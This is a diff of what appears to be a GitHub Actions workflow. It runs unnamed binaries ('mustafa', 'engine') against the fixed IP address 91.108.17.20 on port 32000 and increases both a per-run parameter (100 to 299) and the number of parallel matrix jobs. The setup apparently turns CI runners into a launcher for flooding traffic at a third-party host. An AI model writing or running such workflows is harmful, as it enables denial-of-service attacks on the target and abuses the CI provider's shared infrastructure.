@@ -24,9 +24,9 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: |
-          if [ -f "./mustafa" ]; then chmod +x ./mustafa && ./mustafa direct 91.108.17.20 32000 100 1;
-          elif [ -f "./mustafa" ]; then chmod +x ./mustafa && ./mustafa direct 91.108.17.20 32000 100 1;
-          elif [ -f "./engine" ]; then chmod +x ./engine && ./engine direct 91.108.17.20 32000 100 1;
+          if [ -f "./mustafa" ]; then chmod +x ./mustafa && ./mustafa direct 91.108.17.20 32000 299 1;
+          elif [ -f "./mustafa" ]; then chmod +x ./mustafa && ./mustafa direct 91.108.17.20 32000 299 1;
+          elif [ -f "./engine" ]; then chmod +x ./engine && ./engine direct 91.108.17.20 32000 299 1;
           fi
 
   stage-2-calc:
@@ -36,7 +36,7 @@ jobs:
     steps:
       - id: calc
         run: |
-          NUM_JOBS=$((100 / 10))
+          NUM_JOBS=$((299 / 10))
           ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
           echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
 
